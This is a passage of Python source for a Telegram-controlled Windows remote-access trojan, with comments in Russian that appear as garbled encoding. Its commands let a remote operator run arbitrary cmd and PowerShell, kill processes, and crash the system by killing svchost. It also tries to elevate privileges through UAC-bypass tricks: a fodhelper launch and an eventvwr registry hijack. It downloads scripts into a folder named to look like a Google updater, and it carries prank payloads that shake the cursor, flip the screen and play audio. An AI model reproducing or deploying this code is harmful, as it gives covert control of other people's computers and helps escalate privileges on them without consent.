            '/v', 'Enable', '/t', 'REG_DWORD', '/d', '0', '/f'
        ], check=True)

        # –ü–µ—Ä–µ–∑–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≤–æ–¥–Ω–∏–∫ Windows, —á—Ç–æ–±—ã –∏–∑–º–µ–Ω–µ–Ω–∏—è –≤—Å—Ç—É–ø–∏–ª–∏ –≤ —Å–∏–ª—É
        subprocess.run(['taskkill', '/F', '/IM', 'explorer.exe'], check=True)
        subprocess.run(['start', 'explorer.exe'], check=True)

        return "‚úÖ –¶–≤–µ—Ç–æ–≤–æ–π —Ñ–∏–ª—å—Ç—Ä –æ—Ç–∫–ª—é—á–µ–Ω."
    except subprocess.CalledProcessError as e:
        return f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–∫–ª—é—á–µ–Ω–∏–∏ —Ü–≤–µ—Ç–æ–≤–æ–≥–æ —Ñ–∏–ª—å—Ç—Ä–∞: {e}"

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ü–≤–µ—Ç–æ–≤
@bot.message_handler(func=lambda message: message.text.startswith("!invert"))
def handle_invert(message):
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞ –ø—Ä–∞–≤–∏–ª—å–Ω–æ—Å—Ç—å –∫–æ–º–∞–Ω–¥—ã
    command = message.text.split()
    if len(command) != 2 or command[1] not in ["on", "off"]:
        bot.send_message(message.chat.id, "‚ùå –ù–µ–≤–µ—Ä–Ω–∞—è –∫–æ–º–∞–Ω–¥–∞! –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ !invert on –¥–ª—è –≤–∫–ª—é—á–µ–Ω–∏—è –∏ !invert off –¥–ª—è –æ—Ç–∫–ª—é—á–µ–Ω–∏—è.")
        return
    
    if command[1] == "on":
        bot.send_message(message.chat.id, "üîÑ –í–∫–ª—é—á–µ–Ω–∏–µ –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ü–≤–µ—Ç–æ–≤ —ç–∫—Ä–∞–Ω–∞... –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ.")
        result = enable_color_invert()  # –í–∞–∂–Ω–æ –≤—ã–∑–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é
        bot.send_message(message.chat.id, result)
    elif command[1] == "off":
        bot.send_message(message.chat.id, "üîÑ –û—Ç–∫–ª—é—á–µ–Ω–∏–µ –∏–Ω–≤–µ—Ä—Ç–∏—Ä–æ–≤–∞–Ω–∏—è —Ü–≤–µ—Ç–æ–≤ —ç–∫—Ä–∞–Ω–∞... –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ.")
        result = disable_color_invert()  # –í–∞–∂–Ω–æ –≤—ã–∑–≤–∞—Ç—å —Ñ—É–Ω–∫—Ü–∏—é
        bot.send_message(message.chat.id, result)

#FLIP

appdata_path = os.getenv("APPDATA")
scripts_dir = os.path.join(appdata_path, "GoogleUpdater", "files")

# –§–∞–π–ª—ã –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏
ps1_url = "https://raw.githubusercontent.com/Clicketyclick/ChangeScreenOrientation/refs/heads/master/ChangeOrientation.ps1"
cmd_url = "https://raw.githubusercontent.com/Clicketyclick/ChangeScreenOrientation/refs/heads/master/co.cmd"

ps1_file = os.path.join(scripts_dir, "ChangeOrientation.ps1")
cmd_file = os.path.join(scripts_dir, "co.cmd")

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–≥—Ä—É–∑–∫–∏ —Ñ–∞–π–ª–æ–≤
def download_file(url, dest_path):
    urllib.request.urlretrieve(url, dest_path)

# –ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è —Ñ–∞–π–ª–æ–≤
def check_files():
    return os.path.exists(ps1_file) and os.path.exists(cmd_file)

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —Ñ–∞–π–ª–æ–≤ –∏ –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è —Å—Ç–∞—Ç—É—Å–∞
@bot.message_handler(func=lambda message: message.text.startswith("!flipinstall"))
def install(message):
    if not check_files():
        bot.send_message(message.chat.id, "üì• –ó–∞–≥—Ä—É–∂–∞–µ–º –∏ —É—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ —Ñ–∞–π–ª—ã...")

        if not os.path.exists(scripts_dir):
            os.makedirs(scripts_dir)

        download_file(ps1_url, ps1_file)
        download_file(cmd_url, cmd_file)

        bot.send_message(message.chat.id, "‚úÖ –§–∞–π–ª—ã –∑–∞–≥—Ä—É–∂–µ–Ω—ã!\nüîß –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∏ –Ω–∞—Å—Ç—Ä–∞–∏–≤–∞–µ–º...")

        time.sleep(2)

        if check_files():
            bot.send_message(message.chat.id, "‚úÖ –£—Å—Ç–∞–Ω–æ–≤–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞! –ü—Ä–æ–≥—Ä–∞–º–º—ã –≥–æ—Ç–æ–≤—ã –∫ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—é.")
        else:
            bot.send_message(message.chat.id, "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ —É—Å—Ç–∞–Ω–æ–≤–∫–µ —Ñ–∞–π–ª–æ–≤.")
    else:
        bot.send_message(message.chat.id, "‚úÖ –§–∞–π–ª—ã —É–∂–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã.")

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –∏–∑–º–µ–Ω–µ–Ω–∏—è –æ—Ä–∏–µ–Ω—Ç–∞—Ü–∏–∏ —ç–∫—Ä–∞–Ω–∞
@bot.message_handler(func=lambda message: message.text.startswith("!flipscreen"))
def flipscreen(message):
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –µ—Å—Ç—å –ª–∏ –∞—Ä–≥—É–º–µ–Ω—Ç –≤ –∫–æ–º–∞–Ω–¥–µ
    if len(message.text.split()) < 2:
        bot.send_message(message.chat.id, "‚ùå !flipinstall –Ω–µ –∑–∞–±—É–¥—å. –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –∫–æ–º–∞–Ω–¥—É –≤ —Ñ–æ—Ä–º–∞—Ç–µ: !flipscreen <direction>")
        return

    direction = message.text.split()[1]
    valid_directions = ['right', 'left', 'down', 'up', 'reset', 'reverse-portrait', 'reverse-landscape']
    
    if direction not in valid_directions:
        bot.send_message(message.chat.id, f"‚ùå –ù–µ–≤–µ—Ä–Ω–æ–µ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ. –î–æ—Å—Ç—É–ø–Ω—ã–µ –Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏—è: {', '.join(valid_directions)}.")
        return

    # –ï—Å–ª–∏ —Ñ–∞–π–ª—ã –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã, —Ç–æ —Å–Ω–∞—á–∞–ª–∞ –≤—ã–∑—ã–≤–∞–µ–º —É—Å—Ç–∞–Ω–æ–≤–∫—É
    if not check_files():
        bot.send_message(message.chat.id, "üîß –ü—Ä–æ–≥—Ä–∞–º–º—ã –µ—â–µ –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω—ã. –ù–∞—á–∏–Ω–∞—é —É—Å—Ç–∞–Ω–æ–≤–∫—É...")
        install(message)  # –ó–∞–ø—É—Å–∫–∞–µ–º —É—Å—Ç–∞–Ω–æ–≤–∫—É
        bot.send_message(message.chat.id, "üñ• –ü–æ—Å–ª–µ —É—Å—Ç–∞–Ω–æ–≤–∫–∏ —ç–∫—Ä–∞–Ω –Ω–µ –±—É–¥–µ—Ç –≤—Ä–∞—â–∞—Ç—å—Å—è –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏.\n–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –∑–∞–ø—É—Å—Ç–∏—Ç–µ –∫–æ–º–∞–Ω–¥—É —Å–Ω–æ–≤–∞.")
        return

    # –ï—Å–ª–∏ —Ñ–∞–π–ª—ã –µ—Å—Ç—å, –≤—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É –≤—Ä–∞—â–µ–Ω–∏—è —ç–∫—Ä–∞–Ω–∞
    if direction == 'right':
        bot.send_message(message.chat.id, "üîÑ right.")
        subprocess.run([cmd_file, 'right'], check=True)
    elif direction == 'left':
        bot.send_message(message.chat.id, "üîÑ left.")
        subprocess.run([cmd_file, 'left'], check=True)
    elif direction == 'down':
        bot.send_message(message.chat.id, "üîÑ down.")
        subprocess.run([cmd_file, 'down'], check=True)
    elif direction == 'up':
        bot.send_message(message.chat.id, "üîÑ up.")
        subprocess.run([cmd_file, 'up'], check=True)
    elif direction == 'reset':
        bot.send_message(message.chat.id, "üîÑ resetted.")
        subprocess.run([cmd_file, 'reset'], check=True)
    elif direction == 'reverse-portrait':
        bot.send_message(message.chat.id, "üîÑ reverse-portrait.")
        subprocess.run([cmd_file, 'reverse-portrait'], check=True)
    elif direction == 'reverse-landscape':
        bot.send_message(message.chat.id, "üîÑ reverse-landscape.")
        subprocess.run([cmd_file, 'reverse-landscape'], check=True)

#FLIP

@bot.message_handler(func=lambda message: message.text.startswith("!cd"))
def cd(message):
    # –î–µ–π—Å—Ç–≤–∏–µ –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é - –æ—Ç–∫—Ä—ã—Ç—å
    action = message.text.split()[1].lower() if len(message.text.split()) > 1 else "open"
    
    def get_cd_drives():
        """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö CD/DVD –ø—Ä–∏–≤–æ–¥–æ–≤."""
        drives = []
        bitmask = win32api.GetLogicalDrives()
        for letter in range(26):  # A-Z
            if bitmask & (1 << letter):
                drive = f"{chr(65 + letter)}:\\"
                if win32file.GetDriveType(drive) == win32con.DRIVE_CDROM:
                    drives.append(drive)
        return drives

    def open_tray():
        """–ü—ã—Ç–∞–µ—Ç—Å—è –æ—Ç–∫—Ä—ã—Ç—å –≤—Å–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–Ω—ã–µ CD-–ø—Ä–∏–≤–æ–¥—ã."""
        success = False
        drives = get_cd_drives()

        for drive in drives:
            try:
                subprocess.run(f"powershell -Command (New-Object -ComObject Shell.Application).Namespace(17).ParseName('{drive}').InvokeVerb('Eject')", check=True)
                success = True
            except:
                pass

            try:
                ctypes.windll.winmm.mciSendStringW(f"set cdaudio door open", None, 0, None)
                success = True
            except:
                pass

        return success

    def close_tray():
        """–ü—ã—Ç–∞–µ—Ç—Å—è –∑–∞–∫—Ä—ã—Ç—å –≤—Å–µ –æ–±–Ω–∞—Ä—É–∂–µ–Ω–Ω—ã–µ CD-–ø—Ä–∏–≤–æ–¥—ã."""
        success = False
        drives = get_cd_drives()

        for drive in drives:
            try:
                ctypes.windll.winmm.mciSendStringW(f"set cdaudio door closed", None, 0, None)
                success = True
            except:
                pass

        return success

    # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ –¥–µ–π—Å—Ç–≤–∏—è
    if action == "open":
        if open_tray():
            bot.send_message(message.chat.id, "‚úÖ CD tray opened.")
        else:
            bot.send_message(message.chat.id, "‚ùå Failed to open CD tray.")
    elif action == "close":
        if close_tray():
            bot.send_message(message.chat.id, "‚úÖ CD tray closed.")
        else:
            bot.send_message(message.chat.id, "‚ùå Failed to close CD tray.")
    else:
        bot.send_message(message.chat.id, "‚ùå Use: `!cd open` or `!cd close`.")

@bot.message_handler(func=lambda message: message.text.startswith("!rickroll"))
def rickroll(message):

    try:
        bot.send_message(message.chat.id, "üîÑ downloading rickroll...")
        rickroll_url = "https://www.myinstants.com/media/sounds/rickroll.mp3"
        local_path = os.path.join(VIDEO_PATH, "rickroll.mp3")

        response = requests.get(rickroll_url)
        with open(local_path, "wb") as f:
            f.write(response.content)

        bot.send_message(message.chat.id, "üéµ Rickrolling...")
        pygame.mixer.init()
        pygame.mixer.music.load(local_path)
        pygame.mixer.music.play()

        # –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ç—Ä–µ–∫–∞
        while pygame.mixer.music.get_busy():
            asyncio.sleep(1)

        pygame.mixer.quit()
        os.remove(local_path)  # –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª –ø–æ—Å–ª–µ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è
        bot.send_message(message.chat.id, "‚úÖ RickRolled!")

    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå ERROR: {e}")

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è TTS
@bot.message_handler(func=lambda message: message.text.startswith("!tts"))
def tts(message):
    try:
        args = message.text.split(" ", 3)
        if len(args) < 4:
            bot.send_message(message.chat.id, "‚ùå Missing text argument!")
            return

        speed = int(args[1]) if len(args) > 1 else 400
        pitch = int(args[2]) if len(args) > 2 else 0
        text = args[3]

        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è COM –¥–ª—è pyttsx3
        ctypes.windll.Ole32.CoInitialize(None)  # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è COM –±–∏–±–ª–∏–æ—Ç–µ–∫–∏

        engine = pyttsx3.init()

        # –ú–∞–∫—Å–∏–º–∞–ª—å–Ω–∞—è —Å–∫–æ—Ä–æ—Å—Ç—å
        engine.setProperty('rate', min(speed, 999))  # –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º, —á—Ç–æ–±—ã –Ω–µ –±—ã–ª–æ —Å–ª–∏—à–∫–æ–º –±—ã—Å—Ç—Ä–æ

        # –ü–æ–ø—ã—Ç–∫–∞ –∏–∑–º–µ–Ω–∏—Ç—å –≥–æ–ª–æ—Å (–¥–ª—è –ø–æ–≤—ã—à–µ–Ω–∏—è –≤—ã—Å–æ—Ç—ã —Ç–æ–Ω–∞)
        voices = engine.getProperty('voices')
        if pitch < len(voices):  
            engine.setProperty('voice', voices[pitch].id)
        
        engine.say(text)
        engine.runAndWait()

        bot.send_message(message.chat.id, f"üîä TTS Played at {speed} speed with pitch {pitch}.")

    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå ERROR: {e}")

# –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è –∑–≤—É–∫–∞ –∏–∑ URL
@bot.message_handler(func=lambda message: message.text.startswith("!sound"))
def sound(message):
    try:
        args = message.text.split(" ", 1)
        if len(args) < 2:
            bot.send_message(message.chat.id, "‚ùå Missing URL argument!")
            return
        
        url = args[1]  # –ë–µ—Ä–µ–º URL –∏–∑ –∞—Ä–≥—É–º–µ–Ω—Ç–æ–≤
        bot.send_message(message.chat.id, "üîÑ Downloading audio...")

        if not os.path.exists(VIDEO_PATH):  # –°–æ–∑–¥–∞–µ–º –ø–∞–ø–∫—É, –µ—Å–ª–∏ –µ—ë –Ω–µ—Ç
            os.makedirs(VIDEO_PATH)

        file_name = url.split("/")[-1]
        local_path = os.path.join(VIDEO_PATH, file_name)

        response = requests.get(url)
        with open(local_path, "wb") as f:
            f.write(response.content)

        bot.send_message(message.chat.id, f"üéµ Playing {file_name}...")

        pygame.mixer.init()
        pygame.mixer.music.load(local_path)
        pygame.mixer.music.play()

        # –û–∂–∏–¥–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ç—Ä–µ–∫–∞
        while pygame.mixer.music.get_busy():
            pygame.time.delay(100)

        pygame.mixer.quit()
        os.remove(local_path)  # –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª –ø–æ—Å–ª–µ –≤–æ—Å–ø—Ä–æ–∏–∑–≤–µ–¥–µ–Ω–∏—è
        bot.send_message(message.chat.id, "‚úÖ Sound played!")

    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå ERROR: {e}")



shake_active = False

@bot.message_handler(func=lambda message: message.text.startswith("!shake"))
def shake(message):
    global shake_active

    # –†–∞–∑–±–æ—Ä –∫–æ–º–∞–Ω–¥—ã
    parts = message.text.split()
    
    if len(parts) < 3:
        bot.send_message(message.chat.id, "‚ùå Use: `!shake <intensity> on` –∏–ª–∏ `!shake <intensity> off`")
        return
    
    try:
        intensity = int(parts[1])
        state = parts[2].lower()
    except ValueError:
        bot.send_message(message.chat.id, "‚ùå Invalid intensity value. It should be an integer.")
        return

    if state == "on":
        if shake_active:
            return bot.send_message(message.chat.id, "üîÑ Cursor shaking already!")

        shake_active = True
        bot.send_message(message.chat.id, f"üîÑ Cursor shaking with intensity: {intensity}")

        def shake_mouse():
            while shake_active:
                x, y = pyautogui.position()
                pyautogui.moveTo(
                    x + random.randint(-intensity, intensity), 
                    y + random.randint(-intensity, intensity), 
                    duration=0.05
                )
                time.sleep(0.05)

        threading.Thread(target=shake_mouse, daemon=True).start()

    elif state == "off":
        if not shake_active:
            return bot.send_message(message.chat.id, "‚úÖ Shake already stopped!")

        shake_active = False
        bot.send_message(message.chat.id, "‚úÖ Shake stopped!")

    else:
        bot.send_message(message.chat.id, "‚ùå Use: `!shake <intensity> on` –∏–ª–∏ `!shake <intensity> off`")

@bot.message_handler(func=lambda message: message.text.startswith("!volume"))
def volume(message):
    try:
        # –ò–∑–≤–ª–µ–∫–∞–µ–º —É—Ä–æ–≤–µ–Ω—å –≥—Ä–æ–º–∫–æ—Å—Ç–∏ –∏–∑ –∫–æ–º–∞–Ω–¥—ã
        parts = message.text.split()
        if len(parts) != 2:
            return bot.send_message(message.chat.id, "‚ùå Please provide a volume level (0-100).")
        
        level = int(parts[1])

        if 0 <= level <= 100:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume_control = cast(interface, POINTER(IAudioEndpointVolume))

            volume_control.SetMasterVolumeLevelScalar(level / 100, None)
            bot.send_message(message.chat.id, f"–ì—Ä–æ–º–∫–æ—Å—Ç—å —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞ –Ω–∞ {level}%")
        else:
            bot.send_message(message.chat.id, "‚ùå Volume level must be between 0 and 100.")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith("!tasklist"))
def tasklist(message):
    try:
        processes = list(psutil.process_iter(attrs=['pid', 'name']))
        open_windows = gw.getWindowsWithTitle('')
        visible_processes = [p for p in processes if any(p.info['name'].lower() in w.title.lower() for w in open_windows)]
        background_processes = [p for p in processes if p not in visible_processes]
        random_bg_processes = random.sample(background_processes, min(len(background_processes), 20))

        tasklist_text = "--- Active Windows ---\n"
        for p in visible_processes[:20]:
            tasklist_text += f"üîπ {p.info['name']} (PID: {p.info['pid']})\n"

        tasklist_text += "\n--- Author: @Ewinnery ---\n"
        for p in random_bg_processes:
            tasklist_text += f"üî∏ {p.info['name']} (PID: {p.info['pid']})\n"

        bot.send_message(message.chat.id, f"```{tasklist_text}```")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith("!taskkill"))
def taskkill(message):
    try:
        parts = message.text.split()
        if len(parts) < 2:
            return bot.send_message(message.chat.id, "‚ùå Please specify the process name to kill.")
        
        name = parts[1]
        result = subprocess.run(["taskkill", "/F", "/IM", name], capture_output=True, text=True)

        if "SUCCESS" in result.stdout:
            bot.send_message(message.chat.id, f"üíÄ {name} Killed!")
        else:
            bot.send_message(message.chat.id, f"üíÄ Failed to kill {name}.")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith("!taskmake"))
def taskmake(message):
    try:
        parts = message.text.split(" ", 1)
        if len(parts) < 2:
            return bot.send_message(message.chat.id, "‚ùå Please provide a task to start.")
        
        task = parts[1]
        result = subprocess.run([task], shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")

        if result.returncode == 0:
            bot.send_message(message.chat.id, f"‚úÖ `{task}` Started.")
        else:
            bot.send_message(message.chat.id, f"‚ùå Error `{task}`: {result.stderr}")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith("!powershell"))
def powershell(message):
    try:
        parts = message.text.split(" ", 1)
        if len(parts) < 2:
            return bot.send_message(message.chat.id, "‚ùå Please provide a command to run.")

        command = parts[1]
        result = subprocess.run(["powershell", "-Command", command], capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr

        if not output:
            output = "No output from command"

        bot.send_message(message.chat.id, f"```{output[:1900]}```")  # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø–æ –¥–ª–∏–Ω–µ —Å–æ–æ–±—â–µ–Ω–∏—è
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå Error: {e}")

@bot.message_handler(func=lambda message: message.text.startswith("!cmd"))
def cmd(message):
    try:
        # –ò–∑–≤–ª–µ–∫–∞–µ–º –∫–æ–º–∞–Ω–¥—É
        parts = message.text.split(" ", 1)
        if len(parts) < 2:
            return bot.send_message(message.chat.id, "‚ùå Please provide a command to run.")

        command = parts[1]

        # –ï—Å–ª–∏ —Å–∏—Å—Ç–µ–º–∞ Windows, –º–µ–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É 'ls' –Ω–∞ 'dir'
        if os.name == "nt":
            command = command.strip()
            if command == "ls":
                command = "dir"
        
        # –í—ã–ø–æ–ª–Ω—è–µ–º –∫–æ–º–∞–Ω–¥—É —Å –ø—Ä–∞–≤–∏–ª—å–Ω–æ–π –∫–æ–¥–∏—Ä–æ–≤–∫–æ–π
        result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        output = result.stdout if result.stdout else result.stderr

        if not output:
            output = "No output from command"

        bot.send_message(message.chat.id, f"```{output[:1900]}```")  # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –ø–æ –¥–ª–∏–Ω–µ —Å–æ–æ–±—â–µ–Ω–∏—è
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå Error: {e}")

@bot.message_handler(commands=['bsod'])
def bsod(message):
    """–í—ã–∑—ã–≤–∞–µ—Ç —Å–∏–Ω–∏–π —ç–∫—Ä–∞–Ω —Å–º–µ—Ä—Ç–∏ (BSOD)."""
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            bot.send_message(message.chat.id, "üíÄ –í—ã–∑—ã–≤–∞—é BSOD...")
            subprocess.run("taskkill /IM svchost.exe /F", shell=True)  # –ü—Ä–µ—Ä—ã–≤–∞–Ω–∏–µ –∫—Ä–∏—Ç–∏—á–µ—Å–∫–æ–≥–æ –ø—Ä–æ—Ü–µ—Å—Å–∞
        else:
            bot.send_message(message.chat.id, "‚ùå –ù—É–∂–Ω–æ –±—ã—Ç—å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º –¥–ª—è –≤—ã–∑–æ–≤–∞ BSOD!")
    except Exception as e:
        bot.send_message(message.chat.id, f"‚ùå –û—à–∏–±–∫–∞: {e}")

@bot.message_handler(func=lambda message: message.text.startswith('!checkadmin'))
def checkadmin(message):
    checks = []
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ net session
    try:
        result = subprocess.run("net session", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        if result.returncode == 0:
            checks.append("‚úÖ Net session: Admin rights confirmed.")
        else:
            checks.append("‚ùå Net session: No admin rights.")
    except:
        checks.append("‚ùå Net session: Error running command.")
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–∞–ø–∏—Å–∏ –≤ —Å–∏—Å—Ç–µ–º–Ω—É—é –ø–∞–ø–∫—É
    try:
        test_path = "C:\\Windows\\Temp\\test_admin.txt"
        with open(test_path, "w") as f:
            f.write("admin_check")
        os.remove(test_path)
        checks.append("‚úÖ File write test: Admin rights confirmed.")
    except:
        checks.append("‚ùå File write test: No admin rights.")
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —á–µ—Ä–µ–∑ whoami /priv
    try:
        result = subprocess.run("whoami /priv", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        if "SeShutdownPrivilege" in result.stdout:
            checks.append("‚úÖ Whoami priv: Admin rights confirmed.")
        else:
            checks.append("‚ùå Whoami priv: No admin rights.")
    except:
        checks.append("‚ùå Whoami priv: Error running command.")
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —á—Ç–µ–Ω–∏—è —Ä–µ–µ—Å—Ç—Ä–∞ —Å –∞–¥–º–∏–Ω-–ø—Ä–∞–≤–∞–º–∏
    try:
        with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion", 0, winreg.KEY_READ) as key:
            checks.append("‚úÖ Registry read: Admin rights confirmed.")
    except:
        checks.append("‚ùå Registry read: No admin rights.")
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è fsutil (—Ç–æ–ª—å–∫–æ –∞–¥–º–∏–Ω –º–æ–∂–µ—Ç)
    try:
        result = subprocess.run("fsutil dirty query C:", shell=True, capture_output=True, text=True, encoding="cp866", errors="ignore")
        if "is NOT Dirty" in result.stdout or "is Dirty" in result.stdout:
            checks.append("‚úÖ Fsutil: Admin rights confirmed.")
        else:
            checks.append("‚ùå Fsutil: No admin rights.")
    except:
        checks.append("‚ùå Fsutil: Error running command.")
    
    bot.reply_to(message, "\n".join(checks))

@bot.message_handler(func=lambda message: message.text.startswith('!admin'))
def admin(message):
    args = message.text.split()
    
    if len(args) != 4:
        bot.reply_to(message, "‚ùå Incorrect command usage! Use: !admin <title> <icon_url> <method>")
        return
    
    title, icon_url, method = args[1], args[2], args[3]
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ñ–æ—Ä–º–∞—Ç–∞ –∏–∫–æ–Ω–∫–∏
    if not icon_url.endswith(('.png', '.ico', '.jpg', '.jpeg')):
        bot.reply_to(message, "‚ùå Unsupported icon format! Supported formats: .png, .ico, .jpg, .jpeg")
        return
    
    methods = ["uac", "schtask", "bypass", "eventvwr", "slui", "silent"]
    if method not in methods:
        bot.reply_to(message, f"‚ùå Unsupported method! Supported methods: {', '.join(methods)}")
        return
    
    script = ""
    
    # –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —Å–∫—Ä–∏–ø—Ç–∞ –¥–ª—è –∫–∞–∂–¥–æ–≥–æ –º–µ—Ç–æ–¥–∞
    if method == "uac":
        script = 'Start-Process -FilePath "powershell" -ArgumentList "-Command Start-Process powershell -Verb runAs"'
    elif method == "schtask":
        script = f'Schtasks /Create /TN "{title}" /TR "powershell -Command Start-Process powershell -Verb runAs" /SC ONCE /ST 00:00 /RL HIGHEST & Schtasks /Run /TN "{title}"'
    elif method == "bypass":
        script = 'Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"'
    elif method == "eventvwr":
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\\Classes\\mscfile\\shell\\open\\command"
            winreg.CreateKey(key, subkey)
            registry_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(registry_key, None, 0, winreg.REG_SZ, f'cmd.exe /k powershell -Command Start-Process powershell -Verb runAs')
            winreg.CloseKey(registry_key)
            script = 'Start-Process -FilePath "eventvwr.exe"'
        except Exception as e:
            bot.reply_to(message, f"‚ùå Failed to modify registry: {e}")
            return
    elif method == "slui":
        script = 'Start-Process -FilePath "C:\\Windows\\System32\\slui.exe"'
    elif method == "silent":
        script = '''
        $obj = New-Object -ComObject Shell.Application;
        $obj.ShellExecute("powershell", "-Command Start-Process powershell -Verb runAs", "", "runas", 1);
        '''
    
    try:
        subprocess.run(["powershell", "-Command", script], shell=True)
        bot.reply_to(message, f"‚úÖ Admin rights requested using method: {method}\nTitle: {title}, Icon: {icon_url}")
    except Exception as e:
        bot.reply_to(message, f"‚ùå Failed to request admin rights: {e}")

@bot.message_handler(func=lambda message: message.text.startswith('!legitadmin'))
def legitadmin(message):
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –∫–æ–º–∞–Ω–¥–∞ –ø—Ä–∏—à–ª–∞ –æ—Ç –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω–Ω–æ–≥–æ –∫–∞–Ω–∞–ª–∞

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –∑–∞–ø—É—â–µ–Ω –ª–∏ –±–æ—Ç —Å –ø—Ä–∞–≤–∞–º–∏ –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–∞
    if not ctypes.windll.shell32.IsUserAnAdmin():
        bot.reply_to(message, "üîÑ Requesting admin rights...")

        try:
